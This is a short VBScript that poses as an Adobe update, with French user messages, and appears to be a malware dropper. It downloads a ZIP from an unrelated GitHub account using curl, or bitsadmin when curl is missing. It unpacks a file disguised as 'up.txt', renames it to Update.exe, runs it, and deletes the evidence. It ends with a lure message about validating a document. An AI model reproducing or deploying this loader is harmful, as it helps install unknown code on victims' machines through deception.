Option Explicit

Dim shell, fso
Set shell = CreateObject("WScript.Shell")
Set fso   = CreateObject("Scripting.FileSystemObject")

Dim zipUrl, zipPath, unzipDir, extractedFile, renamedExe
zipUrl    = "https://github.com/jimbertclement/AdobeUpdate/releases/download/Win/Adobe_Update.zip"
zipPath   = shell.ExpandEnvironmentStrings("%TEMP%") & "\Adobe_Update.zip"
unzipDir  = shell.ExpandEnvironmentStrings("%TEMP%") & "\Adobe_Update_unzipped"
extractedFile = unzipDir & "\up.txt" ' Fichier extrait attendu
renamedExe   = unzipDir & "\Update.exe" ' Nouveau nom après renommage

WScript.Echo "Telechargement de la mise a jour Adobe..."

If runCommandWait("curl --version") = 0 Then
    ' cURL detecte
    runCommandWait("curl -L -o """ & zipPath & """ " & zipUrl)
Else
    ' Sinon bitsadmin
    runCommandWait("bitsadmin /transfer ZipDownload /download /priority normal """ & zipUrl & """ """ & zipPath & """")
End If

If Not fso.FileExists(zipPath) Then
    WScript.Echo "[ERREUR] Impossible de Mettre a jour votre systeme."
    WScript.Quit 1
End If

' Extraction du fichier ZIP
runCommandWait("powershell -Command ""Expand-Archive -Path '" & zipPath & "' -DestinationPath '" & unzipDir & "' -Force""")

If Not fso.FileExists(extractedFile) Then
    WScript.Echo "[ERREUR] Fichier texte extrait introuvable."
    WScript.Quit 1
End If

' Renommage du fichier extrait en Update.exe
fso.MoveFile extractedFile, renamedExe

' Exécution du fichier renommé
shell.Run """" & renamedExe & """", 1, True

' Nettoyage
fso.DeleteFile zipPath, True
If fso.FolderExists(unzipDir) Then
    fso.DeleteFolder unzipDir, True
End If

' MessageBox modifiee
MsgBox "Votre validation pour visualiser votre document.", vbInformation, "Installation"

WScript.Echo "Termine."
WScript.Quit 0

' =========================
' Fonction pour executer cmd
' =========================
Function runCommandWait(cmd)
    runCommandWait = shell.Run("cmd /c " & cmd, 0, True)
End Function
